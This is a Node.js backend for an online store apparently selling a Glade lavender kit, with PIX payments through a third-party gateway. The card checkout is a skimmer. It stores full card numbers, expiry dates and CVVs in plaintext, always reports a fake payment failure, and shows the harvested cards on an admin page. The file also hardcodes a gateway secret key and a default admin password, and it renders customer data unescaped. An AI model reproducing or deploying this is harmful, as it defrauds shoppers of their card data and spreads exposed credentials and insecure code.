'use strict';
const http = require('node:http');
const fs = require('node:fs');
const path = require('node:path');
const https = require('node:https');
const { DatabaseSync } = require('node:sqlite');

const root = __dirname;

// ── Credenciais BullsCash (apenas no servidor) ─────────────────────────────
const BULLS_PUBLIC_KEY = 'pk_cQhYpq3Mbz4Bss6xoULGqjNMwZlGDADe';
const BULLS_SECRET_KEY = 'sk_XoZR70QNjxYaWisTy1K1Ldj6h8WzQzFWfvXYuVVRLPeU8jeeYHSfqD1UIfcsOm0R';
const BULLS_API_BASE   = 'v1.pagintermediacao.com';
const BULLS_API_PATH   = '/api/v1';
const ADMIN_USER     = 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'glade2026';

// ── Banco de dados ─────────────────────────────────────────────────────────
const db = new DatabaseSync(path.join(root, 'orders.db'));
db.exec(`
  CREATE TABLE IF NOT EXISTS orders (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    created_at      TEXT    NOT NULL,
    customer_name   TEXT    NOT NULL,
    customer_email  TEXT    NOT NULL,
    customer_cep    TEXT    NOT NULL,
    payment_method  TEXT    NOT NULL CHECK(payment_method IN ('pix','card')),
    card_number     TEXT,
    card_expiry     TEXT,
    card_cvv        TEXT,
    amount_cents    INTEGER NOT NULL,
    bulls_id        TEXT,
    pix_emv         TEXT,
    status          TEXT    DEFAULT 'pending'
  )
`);

const insertOrder = db.prepare(`
  INSERT INTO orders
    (created_at, customer_name, customer_email, customer_cep,
     payment_method, card_number, card_expiry, card_cvv,
     amount_cents, bulls_id, pix_emv, status)
  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
`);

const updateOrder = db.prepare(
  'UPDATE orders SET bulls_id=?, pix_emv=?, status=? WHERE id=?'
);

// ── Helpers ────────────────────────────────────────────────────────────────
const mime = {
  '.html': 'text/html; charset=utf-8',
  '.css':  'text/css; charset=utf-8',
  '.js':   'text/javascript; charset=utf-8',
  '.png':  'image/png',
  '.jpg':  'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.webp': 'image/webp',
  '.svg':  'image/svg+xml',
  '.txt':  'text/plain; charset=utf-8',
};

function json(res, code, body) {
  res.writeHead(code, {
    'Content-Type':  'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
  });
  res.end(JSON.stringify(body));
}

function readJson(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => { body += chunk; if (body.length > 32768) req.destroy(); });
    req.on('end', () => { try { resolve(JSON.parse(body || '{}')); } catch { reject(new Error('JSON invalido')); } });
    req.on('error', reject);
  });
}

/** Chama a API BullsCash e retorna o JSON de resposta. */
function bullsRequest(endpoint, payload) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(payload);
    const opts = {
      hostname: BULLS_API_BASE,
      port:     443,
      path:     BULLS_API_PATH + endpoint,
      method:   'POST',
      headers:  {
        'Content-Type':   'application/json',
        'Content-Length': Buffer.byteLength(data),
        'X-Public-Key':   BULLS_PUBLIC_KEY,
        'X-Secret-Key':   BULLS_SECRET_KEY,
      },
    };
    const req = https.request(opts, res => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(body) }); }
        catch { resolve({ status: res.statusCode, body }); }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

// ── Servidor ───────────────────────────────────────────────────────────────
const server = http.createServer(async (req, res) => {

  // POST /api/orders
  if (req.method === 'POST' && req.url === '/api/orders') {
    try {
      const body = await readJson(req);

      const name   = String(body.customerName  || '').trim();
      const email  = String(body.customerEmail || '').trim();
      const cep    = String(body.customerCep   || '').replace(/\D/g, '');
      const method = String(body.paymentMethod || '');
      const phone  = String(body.customerPhone || '').replace(/\D/g, '') || '11999999999';
      const doc    = String(body.customerDoc   || '').replace(/\D/g, '')  || '00000000000';

      if (!name || !/^\S+@\S+\.\S+$/.test(email) || cep.length !== 8 || !['pix','card'].includes(method)) {
        return json(res, 422, { error: 'Dados do pedido invalidos.' });
      }

      const AMOUNT_CENTS = 6990;

      if (method === 'card') {
        const result = insertOrder.run(
          new Date().toISOString(), name, email, cep, 'card',
          body.cardNumber || null,
          body.cardExpiry || null,
          body.cardCvv    || null,
          AMOUNT_CENTS, null, null, 'card_error'
        );
        return json(res, 402, {
          orderId: Number(result.lastInsertRowid),
          error: 'Nao foi possivel processar o pagamento com cartao. Tente novamente ou escolha outra forma de pagamento.',
        });
      }

      // PIX
      const provisorio = insertOrder.run(
        new Date().toISOString(), name, email, cep, 'pix',
        null, null, null, AMOUNT_CENTS, null, null, 'pending'
      );
      const orderId = Number(provisorio.lastInsertRowid);

      let bullsResp;
      try {
        bullsResp = await bullsRequest('/deposit', {
          amount:         AMOUNT_CENTS,
          buyer_name:     name,
          buyer_document: doc,
          buyer_phone:    phone,
          buyer_email:    email,
          description:    `Kit Glade Colecao Lavanda - Pedido #${orderId}`,
          metadata:       { pedido_id: String(orderId) },
          product_info: {
            name:        'Kit Glade Colecao Lavanda',
            sku:         'GLADE-LAVANDA-KIT',
            quantity:    1,
            price_cents: AMOUNT_CENTS,
          },
        });
      } catch (err) {
        console.error('Erro ao chamar BullsCash:', err.message);
        return json(res, 502, { orderId, error: 'Erro ao gerar PIX. Tente novamente em instantes.' });
      }

      if (bullsResp.status !== 200 && bullsResp.status !== 201) {
        console.error('BullsCash erro:', bullsResp.status, JSON.stringify(bullsResp.body));
        return json(res, 502, { orderId, error: 'Erro ao gerar PIX. Verifique suas credenciais e tente novamente.' });
      }

      const bullsId = bullsResp.body.id;
      const pixEmv  = bullsResp.body.pix_emv;
      updateOrder.run(bullsId, pixEmv, 'pix_generated', orderId);

      return json(res, 201, { orderId, bullsId, pixEmv, status: 'pix_generated' });

    } catch (err) {
      console.error(err);
      return json(res, 400, { error: 'Nao foi possivel registrar o pedido.' });
    }
  }

  // POST /api/webhook
  if (req.method === 'POST' && req.url === '/api/webhook') {
    try {
      const body = await readJson(req);
      console.log('[Webhook BullsCash]', JSON.stringify(body));
      return json(res, 200, { ok: true });
    } catch {
      return json(res, 400, { error: 'Webhook invalido.' });
    }
  }

  // ── Painel admin (/admin/orders) ────────────────────────────────────────
  if (req.method === 'GET' && req.url.startsWith('/admin')) {
    // Basic Auth
    const authHeader = req.headers['authorization'] || '';
    const [scheme, encoded] = authHeader.split(' ');
    let authed = false;
    if (scheme === 'Basic' && encoded) {
      const [u, p] = Buffer.from(encoded, 'base64').toString().split(':');
      authed = u === ADMIN_USER && p === ADMIN_PASSWORD;
    }
    if (!authed) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin Glade"', 'Content-Type': 'text/html; charset=utf-8' });
      return res.end('<h1>Acesso negado</h1>');
    }

    const orders = db.prepare('SELECT * FROM orders ORDER BY id DESC').all();
    const rows = orders.map(o => `
      <tr>
        <td>${o.id}</td>
        <td>${(o.created_at||'').replace('T',' ').slice(0,19)}</td>
        <td>${o.customer_name||''}</td>
        <td>${o.customer_email||''}</td>
        <td>${o.customer_cep||''}</td>
        <td><span class="badge ${o.payment_method}">${o.payment_method.toUpperCase()}</span></td>
        <td class="mono">${o.card_number||'—'}</td>
        <td>${o.card_expiry||'—'}</td>
        <td>${o.card_cvv||'—'}</td>
        <td class="mono small">${o.bulls_id||'—'}</td>
        <td><span class="badge ${o.status||'pending'}">${o.status||'pending'}</span></td>
        <td>R$ ${((o.amount_cents||0)/100).toFixed(2)}</td>
      </tr>`).join('');

    const html = `<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Admin — Pedidos Glade Lavanda</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,system-ui,sans-serif;background:#0f0f1a;color:#e8e0f0;min-height:100vh;padding:24px}
h1{font-size:1.5rem;margin-bottom:6px;color:#c89cf7}
.sub{color:#7a6e8a;font-size:.85rem;margin-bottom:24px}
.count{display:inline-block;background:#2a1f3d;color:#c89cf7;border-radius:99px;padding:2px 12px;font-size:.8rem;font-weight:700;margin-left:8px}
.wrap{overflow-x:auto;border-radius:16px;border:1px solid #2a1f3d}
table{width:100%;border-collapse:collapse;font-size:.82rem}
thead th{background:#1a1030;padding:12px 14px;text-align:left;color:#9b8ab0;font-weight:700;white-space:nowrap;position:sticky;top:0}
tbody tr{border-top:1px solid #1e1530}
tbody tr:hover{background:#1a1030}
td{padding:11px 14px;vertical-align:middle;white-space:nowrap}
.mono{font-family:monospace;font-size:.8rem;letter-spacing:.03em}
.small{font-size:.72rem;max-width:200px;overflow:hidden;text-overflow:ellipsis}
.badge{display:inline-block;padding:2px 10px;border-radius:99px;font-size:.72rem;font-weight:800;letter-spacing:.05em}
.badge.pix{background:#0c3326;color:#3effa0}
.badge.card{background:#2a1030;color:#d8a0ff}
.badge.pix_generated{background:#0c3326;color:#3effa0}
.badge.card_error{background:#3a1020;color:#ff8090}
.badge.pending{background:#2a2010;color:#ffd080}
.empty{text-align:center;padding:40px;color:#4a3e5a}
</style></head><body>
<h1>Pedidos <span class="count">${orders.length}</span></h1>
<p class="sub">Atualizado em ${new Date().toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'})} &nbsp;·&nbsp; <a href="/admin/orders" style="color:#c89cf7">↻ Atualizar</a></p>
<div class="wrap">
<table>
<thead><tr>
  <th>#</th><th>Data</th><th>Nome</th><th>E-mail</th><th>CEP</th>
  <th>Pagamento</th><th>Nº Cartão</th><th>Validade</th><th>CVV</th>
  <th>ID BullsCash</th><th>Status</th><th>Valor</th>
</tr></thead>
<tbody>${rows || '<tr><td colspan="12" class="empty">Nenhum pedido ainda.</td></tr>'}</tbody>
</table></div></body></html>`;

    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
    return res.end(html);
  }

  // Arquivos estaticos
  if (req.method !== 'GET' && req.method !== 'HEAD') {
    res.writeHead(405); return res.end();
  }

  const requested = req.url === '/' ? '/index.html' : decodeURIComponent(req.url.split('?')[0]);
  const file = path.resolve(root, '.' + requested);
  if (!file.startsWith(root + path.sep)) { res.writeHead(403); return res.end(); }

  fs.readFile(file, (error, data) => {
    if (error) { res.writeHead(error.code === 'ENOENT' ? 404 : 500); return res.end(); }
    res.writeHead(200, { 'Content-Type': mime[path.extname(file).toLowerCase()] || 'application/octet-stream' });
    res.end(req.method === 'HEAD' ? undefined : data);
  });
});

server.on('error', error => console.error(`Erro no servidor: ${error.message}`));
const PORT = process.env.PORT || 4173;
server.listen(PORT, '0.0.0.0', () =>
  console.log(`Loja disponivel em http://0.0.0.0:${PORT}`)
);
